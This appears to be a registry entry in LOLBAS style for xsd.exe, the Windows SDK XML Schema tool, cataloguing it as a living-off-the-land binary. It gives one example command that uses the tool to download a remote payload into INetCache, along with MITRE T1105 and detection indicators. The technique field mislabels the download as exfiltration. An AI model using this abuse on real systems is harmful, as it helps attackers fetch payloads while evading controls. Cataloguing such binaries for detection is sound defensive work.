---
id: windows-download-xsd
namespace: windows:download:xsd
name: xsd
description: 'XML Schema Definition Tool included with the Windows Software Development Kit (SDK). Located at: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version> Tools\xsd.exe.'
author: Avihay Eldad
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- xsd
parameters: []
features: []
execution:
  template: xsd
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache)
  command: xsd.exe {REMOTEURL}
references: []
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: ioc
  description: URL on a xsd.exe command line
- type: ioc
  description: xsd.exe making unexpected network connections or DNS requests
install:
- method: choco
  package_name: xsd
  commands:
  - choco install xsd
---


# xsd

xsd is a Windows LOLBin. XML Schema Definition Tool included with the Windows Software Development Kit (SDK). Located at: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version> Tools\xsd.exe.
